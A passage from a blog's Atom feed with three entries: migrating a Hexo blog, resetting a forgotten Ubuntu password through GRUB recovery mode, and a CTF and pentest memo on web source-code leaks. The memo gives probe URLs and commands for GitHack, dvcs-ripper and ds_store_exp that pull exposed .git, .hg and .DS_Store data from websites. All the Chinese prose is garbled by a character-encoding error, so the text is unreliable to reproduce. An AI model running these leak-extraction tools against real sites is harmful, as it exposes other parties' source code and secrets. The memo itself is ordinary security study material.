    <content type="html"><![CDATA[<p>ç½‘ä¸Šä¹Ÿæœ‰ç±»ä¼¼çš„æ•™ç¨‹ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¦å»ä¸Šç½‘æŸ¥è¯¢æ€ä¹ˆå»é…ç½®ï¼Œæ¯”è¾ƒè€—æ—¶ã€‚æ‰€ä»¥å°±è‡ªå·±è®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ä»¥åçœ‹ã€‚</p><a id="more"></a><h2 id="å¼€å§‹å‰å‡†å¤‡"><a href="#å¼€å§‹å‰å‡†å¤‡" class="headerlink" title="å¼€å§‹å‰å‡†å¤‡"></a>å¼€å§‹å‰å‡†å¤‡</h2><p>æœ¬åšæ–‡é»˜è®¤<code>git</code>,<code>nodejs</code>å·²ç»å®‰è£…å¥½</p><h2 id="åˆ†ææ–‡ä»¶"><a href="#åˆ†ææ–‡ä»¶" class="headerlink" title="åˆ†ææ–‡ä»¶"></a>åˆ†ææ–‡ä»¶</h2><h3 id="1-å“ªäº›æ–‡ä»¶æ˜¯å¿…é¡»æ‹·è´èµ°çš„-æ‹·è´åˆ°æ–°çš„ç”µè„‘"><a href="#1-å“ªäº›æ–‡ä»¶æ˜¯å¿…é¡»æ‹·è´èµ°çš„-æ‹·è´åˆ°æ–°çš„ç”µè„‘" class="headerlink" title="1.å“ªäº›æ–‡ä»¶æ˜¯å¿…é¡»æ‹·è´èµ°çš„(æ‹·è´åˆ°æ–°çš„ç”µè„‘)"></a>1.å“ªäº›æ–‡ä»¶æ˜¯å¿…é¡»æ‹·è´èµ°çš„(æ‹·è´åˆ°æ–°çš„ç”µè„‘)</h3><p>é¦–å…ˆæ˜¯ä¹‹å‰è‡ªå·±ä¿®æ”¹çš„æ–‡ä»¶ï¼Œåƒé…ç½®æ–‡ä»¶<code>_config.yml</code>,<code>theme</code>æ–‡ä»¶å¤¹ï¼Œ<code>source</code>æ–‡ä»¶å¤¹è‡ªå·±å†™çš„åŸå§‹æ–‡ä»¶è¿™äº›éƒ½æ˜¯å¿…é¡»è¦æ‹·è´èµ°çš„ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰<code>scaffolds</code>æ–‡ä»¶å¤¹(æ–‡ä»¶çš„æ¨¡æ¿)ï¼Œ<code>package.json</code>(ä½¿ç”¨å“ªäº›åŒ…)ï¼Œ<code>.gitignore</code>(æäº¤å¿½ç•¥å“ªäº›æ–‡ä»¶å¤¹)<br>æ€»ç»“ï¼š</p><ul><li><code>_config.yml</code></li><li><code>theme</code></li><li><code>source</code></li><li><code>scaffolds</code></li><li><code>package.json</code></li><li><code>.gitignore</code></li></ul><p><strong>è¿™äº›æ˜¯éœ€è¦æ‹·è´çš„</strong></p><h3 id="2-å“ªäº›æ–‡ä»¶æ˜¯éœ€è¦å¿½ç•¥ä¸ç”¨ç®¡çš„"><a href="#2-å“ªäº›æ–‡ä»¶æ˜¯éœ€è¦å¿½ç•¥ä¸ç”¨ç®¡çš„" class="headerlink" title="2.å“ªäº›æ–‡ä»¶æ˜¯éœ€è¦å¿½ç•¥ä¸ç”¨ç®¡çš„"></a>2.å“ªäº›æ–‡ä»¶æ˜¯éœ€è¦å¿½ç•¥ä¸ç”¨ç®¡çš„</h3><ul><li><p><code>.git</code></p></li><li><p><code>node_mouldes/</code> </p></li><li><p><code>public/</code> </p></li><li><p><code>.deploy_git/</code> </p></li><li><p><code>db.json</code></p></li></ul><h2 id="å¼€å§‹è¿ç§»"><a href="#å¼€å§‹è¿ç§»" class="headerlink" title="å¼€å§‹è¿ç§»"></a>å¼€å§‹è¿ç§»</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// å…¨å±€å®‰è£…hexo</span><br><span class="line">sudo npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">// æŠŠå¿…é¡»æ‹·è´çš„æ–‡ä»¶ï¼Œæ‹·è´åˆ°æ–°å»ºçš„æ–‡ä»¶å¤¹å†…ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span><br><span class="line">// åœ¨æ–°å»ºçš„æ–‡ä»¶å¤¹å†…æ‰“å¼€å‘½ä»¤è¡Œï¼Œå®‰è£…å¿…è¦çš„æ¨¡å—ï¼Œåˆå§‹åŒ–</span><br><span class="line">// è¿™é‡Œä¸ç”¨hexo initåˆå§‹åŒ–ï¼Œå› ä¸ºé…ç½®æ–‡ä»¶æˆ‘ä»¬å·²ç»æ‹·è´è¿‡æ¥(ä¸€å®šè¦æ…é‡ï¼Œä¸¥æ ¼æŒ‰ç…§æ•™ç¨‹æ¥)</span><br><span class="line"></span><br><span class="line">sudo npm install</span><br><span class="line"></span><br><span class="line">// å®‰è£…å…¶ä»–ä¸€äº›å¿…è¦çš„ç»„ä»¶</span><br><span class="line">sudo npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">sudo npm install hexo-generator-feed --save</span><br><span class="line"></span><br><span class="line">sudo npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><h2 id="æœ¬åœ°æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ"><a href="#æœ¬åœ°æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ" class="headerlink" title="æœ¬åœ°æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ"></a>æœ¬åœ°æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//å…ˆæœ¬åœ°é¢„è§ˆ</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br><span class="line"></span><br><span class="line">//æ­¤æ—¶å¯ä»¥å…ˆåœ¨localhost:4000 æœ¬åœ°é¢„è§ˆåšå®¢ï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œé‚£å°±è¯´æ˜è¿ç§»æˆåŠŸ</span><br></pre></td></tr></table></figure><h2 id="éƒ¨ç½²åˆ°githubä¸Š"><a href="#éƒ¨ç½²åˆ°githubä¸Š" class="headerlink" title="éƒ¨ç½²åˆ°githubä¸Š"></a>éƒ¨ç½²åˆ°githubä¸Š</h2><p>ç”±äºè¿ç§»çš„åŸå› ï¼Œæœ¬åœ°çš„å…¬é’¥ç§é’¥éœ€è¦é‡æ–°ç”Ÿå­˜ï¼Œè¯·å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.jianshu.com/p/63edbb08bd5f" target="_blank" rel="noopener">Macä¸‹Githubçš„SSHå…¬é’¥ç”Ÿæˆè®°å½•</a></p><p>ç„¶åæµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// æ­£å¼éƒ¨ç½²</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç½‘ä¸Šä¹Ÿæœ‰ç±»ä¼¼çš„æ•™ç¨‹ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¦å»ä¸Šç½‘æŸ¥è¯¢æ€ä¹ˆå»é…ç½®ï¼Œæ¯”è¾ƒè€—æ—¶ã€‚æ‰€ä»¥å°±è‡ªå·±è®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ä»¥åçœ‹ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Blogæ­å»º" scheme="http://0clickjacking0.github.io/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04å¿˜è®°ç™»å½•å¯†ç çš„è§£å†³åŠæ³•ï¼ˆè™šæ‹Ÿæœºä¸‹å¤„ç†æ–¹æ³•ç›¸åŒï¼‰</title>
    <link href="http://0clickjacking0.github.io/2019/04/28/Ubuntu16-04%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E5%BF%98%E8%AE%B0%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://0clickjacking0.github.io/2019/04/28/Ubuntu16-04ï¼ˆè™šæ‹Ÿæœºï¼‰å¿˜è®°ç™»å½•å¯†ç çš„è§£å†³åŠæ³•/</id>
    <published>2019-04-28T08:14:51.000Z</published>
    <updated>2019-05-11T12:52:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>Ubuntu16.04ï¼ˆè™šæ‹Ÿæœºï¼‰å¿˜è®°ç™»å½•å¯†ç çš„è§£å†³åŠæ³•å¤‡å¿˜å½•ï¼Œé˜²æ­¢ä¸‹æ¬¡å¿˜è®°å¯†ç æ—¶ä¸çŸ¥é“è¯¥æ€ä¹ˆåŠ</p><a id="more"></a><h2 id="1-é‡å¯ubuntuç³»ç»Ÿï¼Œå¼€æœºæ—¶é•¿æŒ‰shiftæŒ‰é”®è¿›å…¥GRUBèœå•ï¼Œé€‰æ‹©ç¬¬äºŒä¸ªé«˜çº§é€‰é¡¹ã€‚å¦‚ä¸‹å›¾ï¼š"><a href="#1-é‡å¯ubuntuç³»ç»Ÿï¼Œå¼€æœºæ—¶é•¿æŒ‰shiftæŒ‰é”®è¿›å…¥GRUBèœå•ï¼Œé€‰æ‹©ç¬¬äºŒä¸ªé«˜çº§é€‰é¡¹ã€‚å¦‚ä¸‹å›¾ï¼š" class="headerlink" title="1. é‡å¯ubuntuç³»ç»Ÿï¼Œå¼€æœºæ—¶é•¿æŒ‰shiftæŒ‰é”®è¿›å…¥GRUBèœå•ï¼Œé€‰æ‹©ç¬¬äºŒä¸ªé«˜çº§é€‰é¡¹ã€‚å¦‚ä¸‹å›¾ï¼š"></a>1. é‡å¯ubuntuç³»ç»Ÿï¼Œå¼€æœºæ—¶é•¿æŒ‰shiftæŒ‰é”®è¿›å…¥GRUBèœå•ï¼Œé€‰æ‹©ç¬¬äºŒä¸ªé«˜çº§é€‰é¡¹ã€‚å¦‚ä¸‹å›¾ï¼š</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass1.png?imageslim" alt></p><h2 id="2-åœ¨é«˜çº§é€‰æ‹©ä¸­é€‰æ‹©Recovery-modeæ¨¡å¼ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œé€‰æ‹©ç‰ˆæœ¬æœ€é«˜çš„é‚£ä¸ªï¼Œç„¶åè¿›å…¥Recovery-modeæ¨¡å¼ã€‚é”®ç›˜æŒ‰â€œeâ€é”®è¿›å…¥ç¼–è¾‘æ¨¡å¼ã€‚å¦‚ä¸‹å›¾ï¼Œæ³¨æ„ï¼šä¸è¦å…ˆæŒ‰enteré”®"><a href="#2-åœ¨é«˜çº§é€‰æ‹©ä¸­é€‰æ‹©Recovery-modeæ¨¡å¼ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œé€‰æ‹©ç‰ˆæœ¬æœ€é«˜çš„é‚£ä¸ªï¼Œç„¶åè¿›å…¥Recovery-modeæ¨¡å¼ã€‚é”®ç›˜æŒ‰â€œeâ€é”®è¿›å…¥ç¼–è¾‘æ¨¡å¼ã€‚å¦‚ä¸‹å›¾ï¼Œæ³¨æ„ï¼šä¸è¦å…ˆæŒ‰enteré”®" class="headerlink" title="2. åœ¨é«˜çº§é€‰æ‹©ä¸­é€‰æ‹©Recovery modeæ¨¡å¼ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œé€‰æ‹©ç‰ˆæœ¬æœ€é«˜çš„é‚£ä¸ªï¼Œç„¶åè¿›å…¥Recovery modeæ¨¡å¼ã€‚é”®ç›˜æŒ‰â€œeâ€é”®è¿›å…¥ç¼–è¾‘æ¨¡å¼ã€‚å¦‚ä¸‹å›¾ï¼Œæ³¨æ„ï¼šä¸è¦å…ˆæŒ‰enteré”®"></a>2. åœ¨é«˜çº§é€‰æ‹©ä¸­é€‰æ‹©Recovery modeæ¨¡å¼ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œé€‰æ‹©ç‰ˆæœ¬æœ€é«˜çš„é‚£ä¸ªï¼Œç„¶åè¿›å…¥Recovery modeæ¨¡å¼ã€‚é”®ç›˜æŒ‰â€œeâ€é”®è¿›å…¥ç¼–è¾‘æ¨¡å¼ã€‚å¦‚ä¸‹å›¾ï¼Œæ³¨æ„ï¼šä¸è¦å…ˆæŒ‰enteré”®</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass4.png?imageslim" alt></p><h2 id="3-åœ¨ç¼–è¾‘æ¨¡å¼ä¸­é€šè¿‡ä¸Šä¸‹é”®å¯»æ‰¾åˆ°ROä¿®æ”¹ä¸ºRWæ¨¡å¼-å¯å†™å…¥æ¢å¤æ¨¡å¼-ã€‚å¦‚ä¸‹å›¾ï¼Œç„¶åæŒ‰crtl-Xè¿›å…¥ç³»ç»Ÿ"><a href="#3-åœ¨ç¼–è¾‘æ¨¡å¼ä¸­é€šè¿‡ä¸Šä¸‹é”®å¯»æ‰¾åˆ°ROä¿®æ”¹ä¸ºRWæ¨¡å¼-å¯å†™å…¥æ¢å¤æ¨¡å¼-ã€‚å¦‚ä¸‹å›¾ï¼Œç„¶åæŒ‰crtl-Xè¿›å…¥ç³»ç»Ÿ" class="headerlink" title="3. åœ¨ç¼–è¾‘æ¨¡å¼ä¸­é€šè¿‡ä¸Šä¸‹é”®å¯»æ‰¾åˆ°ROä¿®æ”¹ä¸ºRWæ¨¡å¼(å¯å†™å…¥æ¢å¤æ¨¡å¼)ã€‚å¦‚ä¸‹å›¾ï¼Œç„¶åæŒ‰crtl+Xè¿›å…¥ç³»ç»Ÿ"></a>3. åœ¨ç¼–è¾‘æ¨¡å¼ä¸­é€šè¿‡ä¸Šä¸‹é”®å¯»æ‰¾åˆ°ROä¿®æ”¹ä¸ºRWæ¨¡å¼(å¯å†™å…¥æ¢å¤æ¨¡å¼)ã€‚å¦‚ä¸‹å›¾ï¼Œç„¶åæŒ‰crtl+Xè¿›å…¥ç³»ç»Ÿ</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass2.jpg?imageslim" alt></p><h2 id="4-è¿›è¡Œç³»ç»ŸBIOSç•Œé¢ï¼Œé€šè¿‡ä¸Šä¸‹é”®é€‰æ‹©rootå‘½ä»¤è¡Œï¼Œç‚¹å‡»enteré”®ï¼Œå¦‚ä¸‹å›¾ï¼š"><a href="#4-è¿›è¡Œç³»ç»ŸBIOSç•Œé¢ï¼Œé€šè¿‡ä¸Šä¸‹é”®é€‰æ‹©rootå‘½ä»¤è¡Œï¼Œç‚¹å‡»enteré”®ï¼Œå¦‚ä¸‹å›¾ï¼š" class="headerlink" title="4. è¿›è¡Œç³»ç»ŸBIOSç•Œé¢ï¼Œé€šè¿‡ä¸Šä¸‹é”®é€‰æ‹©rootå‘½ä»¤è¡Œï¼Œç‚¹å‡»enteré”®ï¼Œå¦‚ä¸‹å›¾ï¼š"></a>4. è¿›è¡Œç³»ç»ŸBIOSç•Œé¢ï¼Œé€šè¿‡ä¸Šä¸‹é”®é€‰æ‹©rootå‘½ä»¤è¡Œï¼Œç‚¹å‡»enteré”®ï¼Œå¦‚ä¸‹å›¾ï¼š</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass5.png?imageslim" alt></p><h2 id="5-ç„¶åå†æŒ‰å›è½¦ï¼Œè¿›å…¥shelläº¤äº’æ¨¡å¼ï¼Œè¾“å…¥å‘½ä»¤passwd-usernameï¼ˆusernameä¸ºç”¨æˆ·ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·åä¸ºxianyu123ï¼‰ï¼Œç„¶åå›è½¦ï¼Œè¾“å…¥æ–°å¯†ç å’Œé‡å¤æ–°å¯†ç å³å¯"><a href="#5-ç„¶åå†æŒ‰å›è½¦ï¼Œè¿›å…¥shelläº¤äº’æ¨¡å¼ï¼Œè¾“å…¥å‘½ä»¤passwd-usernameï¼ˆusernameä¸ºç”¨æˆ·ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·åä¸ºxianyu123ï¼‰ï¼Œç„¶åå›è½¦ï¼Œè¾“å…¥æ–°å¯†ç å’Œé‡å¤æ–°å¯†ç å³å¯" class="headerlink" title="5. ç„¶åå†æŒ‰å›è½¦ï¼Œè¿›å…¥shelläº¤äº’æ¨¡å¼ï¼Œè¾“å…¥å‘½ä»¤passwd usernameï¼ˆusernameä¸ºç”¨æˆ·ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·åä¸ºxianyu123ï¼‰ï¼Œç„¶åå›è½¦ï¼Œè¾“å…¥æ–°å¯†ç å’Œé‡å¤æ–°å¯†ç å³å¯"></a>5. ç„¶åå†æŒ‰å›è½¦ï¼Œè¿›å…¥shelläº¤äº’æ¨¡å¼ï¼Œè¾“å…¥å‘½ä»¤<code>passwd username</code>ï¼ˆ<code>username</code>ä¸ºç”¨æˆ·ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·åä¸º<code>xianyu123</code>ï¼‰ï¼Œç„¶åå›è½¦ï¼Œè¾“å…¥æ–°å¯†ç å’Œé‡å¤æ–°å¯†ç å³å¯</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass3.jpg?imageslim" alt></p><h2 id="6-è¾“å…¥sudo-rebootï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æ–°å¯†ç ç™»å½•äº†"><a href="#6-è¾“å…¥sudo-rebootï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æ–°å¯†ç ç™»å½•äº†" class="headerlink" title="6. è¾“å…¥sudo rebootï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æ–°å¯†ç ç™»å½•äº†"></a>6. è¾“å…¥sudo rebootï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æ–°å¯†ç ç™»å½•äº†</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/cnkemi/p/6066441.html" target="_blank" rel="noopener">Ubuntnç³»ç»Ÿå¿˜è®°å¯†ç çš„è§£å†³æ–¹æ³•ï¼ˆè™šæ‹Ÿæœºä¸‹åŒæ ·å¤„ç†ï¼‰</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ubuntu16.04ï¼ˆè™šæ‹Ÿæœºï¼‰å¿˜è®°ç™»å½•å¯†ç çš„è§£å†³åŠæ³•å¤‡å¿˜å½•ï¼Œé˜²æ­¢ä¸‹æ¬¡å¿˜è®°å¯†ç æ—¶ä¸çŸ¥é“è¯¥æ€ä¹ˆåŠ&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://0clickjacking0.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>webå¸¸è§æºç æ³„éœ²</title>
    <link href="http://0clickjacking0.github.io/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>http://0clickjacking0.github.io/2019/04/17/webå¸¸è§æºç æ³„éœ²/</id>
    <published>2019-04-17T08:24:02.000Z</published>
    <updated>2019-05-22T02:06:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>webå¸¸è§æºç æ³„éœ²å¤‡å¿˜å½•</p><a id="more"></a><h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>ç½‘ä¸Šå·²ç»æœ‰éå¸¸å¤šçš„èµ„æ–™äº†ï¼Œå†™æœ¬æ–‡ä¸»è¦æ˜¯ç»å¸¸åœ¨CTFä¸­å’Œwebæ¸—é€æµ‹è¯•æ—¶é‡åˆ°ï¼Œæ‰€ä»¥å½“ä½œè‡ªå·±çš„å¤‡å¿˜å½•è®°å½•ä¸€ä¸‹</p><h1 id="æºç æ³„æ¼åˆ†ç±»"><a href="#æºç æ³„æ¼åˆ†ç±»" class="headerlink" title="æºç æ³„æ¼åˆ†ç±»"></a>æºç æ³„æ¼åˆ†ç±»</h1><h2 id="hgæºç æ³„æ¼"><a href="#hgæºç æ³„æ¼" class="headerlink" title=".hgæºç æ³„æ¼"></a>.hgæºç æ³„æ¼</h2><p><code>hg</code>æ˜¯ç±»ä¼¼äº<code>git</code>çš„ä¸€ç§åˆ†å¸ƒå¼ç®¡ç†</p><h3 id="æ¼æ´æˆå› ï¼š"><a href="#æ¼æ´æˆå› ï¼š" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h3><p><code>hg init</code>çš„æ—¶å€™ä¼šç”Ÿæˆ<code>.hg</code>ï¼ˆåˆå§‹åŒ–ï¼‰</p><h3 id="fuzzï¼š"><a href="#fuzzï¼š" class="headerlink" title="fuzzï¼š"></a>fuzzï¼š</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.hg/</span></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨ï¼š"><a href="#æ¼æ´åˆ©ç”¨ï¼š" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h3><p>å·¥å…·ï¼š<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.hg</span><br></pre></td></tr></table></figure><h2 id="gitæºç æ³„æ¼"><a href="#gitæºç æ³„æ¼" class="headerlink" title=".gitæºç æ³„æ¼"></a>.gitæºç æ³„æ¼</h2><h3 id="æ¼æ´æˆå› ï¼š-1"><a href="#æ¼æ´æˆå› ï¼š-1" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h3><p>åœ¨è¿è¡Œ<code>git init</code>åˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª<code>.git</code>çš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ<code>.git</code>è¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚</p><h3 id="fuzzï¼š-1"><a href="#fuzzï¼š-1" class="headerlink" title="fuzzï¼š"></a>fuzzï¼š</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.git/config</span></span><br></pre></td></tr></table></figure><p>å­˜åœ¨è¯¥é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°é…ç½®ä¿¡æ¯ï¼Œè¯´æ˜å­˜åœ¨è¯¥æ¼æ´</p><h3 id="æ¼æ´åˆ©ç”¨ï¼š-1"><a href="#æ¼æ´åˆ©ç”¨ï¼š-1" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h3><p>å·¥å…·ï¼š<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/</span><br></pre></td></tr></table></figure><p>å·¥å…·ï¼š<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.git</span><br></pre></td></tr></table></figure><h2 id="DS-Storeæ–‡ä»¶æ³„æ¼"><a href="#DS-Storeæ–‡ä»¶æ³„æ¼" class="headerlink" title=".DS_Storeæ–‡ä»¶æ³„æ¼"></a>.DS_Storeæ–‡ä»¶æ³„æ¼</h2><h3 id="æ¼æ´æˆå› ï¼š-2"><a href="#æ¼æ´æˆå› ï¼š-2" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h3><p>åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„<code>.DS_store</code></p><h3 id="fuzzï¼š-2"><a href="#fuzzï¼š-2" class="headerlink" title="fuzzï¼š"></a>fuzzï¼š</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.DS_Store</span></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨ï¼š-2"><a href="#æ¼æ´åˆ©ç”¨ï¼š-2" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h3><p>å·¥å…·ï¼š<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://url/.DS_Store</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¾‘å™¨æ–‡ä»¶æ³„éœ²"><a href="#ç¼–è¾‘å™¨æ–‡ä»¶æ³„éœ²" class="headerlink" title="ç¼–è¾‘å™¨æ–‡ä»¶æ³„éœ²"></a>ç¼–è¾‘å™¨æ–‡ä»¶æ³„éœ²</h2><h3 id="vimæ–‡ä»¶æ³„éœ²"><a href="#vimæ–‡ä»¶æ³„éœ²" class="headerlink" title="vimæ–‡ä»¶æ³„éœ²"></a>vimæ–‡ä»¶æ³„éœ²</h3><p>éæ­£å¸¸å…³é—­vimç¼–è¾‘å™¨ï¼ˆç›´æ¥å…³é—­ç»ˆç«¯ã€ç”µè„‘æ–­ç”µç­‰ï¼‰ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªç”¨äºå¤‡ä»½ç¼“å†²åŒºå†…å®¹çš„ä¸´æ—¶æ–‡ä»¶<code>.swp</code>æ–‡ä»¶ã€‚å®ƒè®°å½•äº†ç”¨æˆ·åœ¨éæ­£å¸¸å…³é—­vimç¼–è¾‘å™¨ä¹‹å‰æœªèƒ½åŠæ—¶ä¿å­˜çš„ä¿®æ”¹ï¼Œç”¨äºæ–‡ä»¶æ¢å¤ã€‚å¹¶ä¸”å¤šæ¬¡æ„å¤–é€€å‡ºå¹¶ä¸ä¼šè¦†ç›–æ—§çš„<code>.swp</code>æ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ï¼Œä¾‹å¦‚<code>.swo</code>æ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚ç¬¬ä¸€æ¬¡äº§ç”Ÿä¸€ä¸ª<code>.test.txt.swp</code>ï¼Œå†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º<code>.test.txt.swo</code>çš„äº¤æ¢æ–‡ä»¶ï¼›è€Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º<code>.test.txt.swn</code>ä¾æ­¤ç±»æ¨ã€‚</p><h3 id="vimå¤‡ä»½æ–‡ä»¶"><a href="#vimå¤‡ä»½æ–‡ä»¶" class="headerlink" title="vimå¤‡ä»½æ–‡ä»¶"></a>vimå¤‡ä»½æ–‡ä»¶</h3><p>é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨Vimç¼–ç¨‹ï¼Œåœ¨ä¿®æ”¹æ–‡ä»¶åç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¸¦<code>~</code>çš„å¤‡ä»½æ–‡ä»¶ï¼ŒæŸäº›æƒ…å†µä¸‹å¯ä»¥å¯¹å…¶ä¸‹è½½è¿›è¡ŒæŸ¥çœ‹</p><p>ä¾‹å¦‚ï¼š<br><code>index.php</code>çš„å¤‡ä»½æ–‡ä»¶åˆ™ä¸º<code>index.php~</code></p><h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>ä½¿ç”¨<code>phpstorm</code>æ–°å»ºé¡¹ç›®æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ª<code>.idea`</code>æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹æœ‰ä¸€ä¸ªworkspace.xml`ï¼Œè®¿é—®å¯ä»¥å¾—åˆ°ä¸€äº›ä¿¡æ¯ã€‚</p><h2 id="ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"><a 